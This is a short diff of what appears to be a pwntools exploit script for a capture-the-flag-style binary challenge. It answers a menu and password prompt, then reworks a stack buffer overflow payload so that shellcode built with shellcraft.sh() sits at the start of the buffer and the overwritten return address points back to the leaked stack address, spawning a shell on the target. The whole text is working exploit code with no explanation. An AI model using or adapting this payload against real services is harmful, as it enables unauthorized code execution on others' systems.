@@ -23,9 +23,9 @@ io.sendlineafter('> ', '2')
 io.sendlineafter('password: ', password)
 
 log.info('Send payload')
-padding = b'A' * ret_offset
 shellcode = asm(shellcraft.sh())
-payload = padding + p64(stack_address + ret_offset + 8) + shellcode
+padding = b'A' * (ret_offset - len(shellcode))
+payload = shellcode + padding + p64(stack_address)
 io.sendlineafter('commands: ', payload)
 
 log.info('Trigger Return')
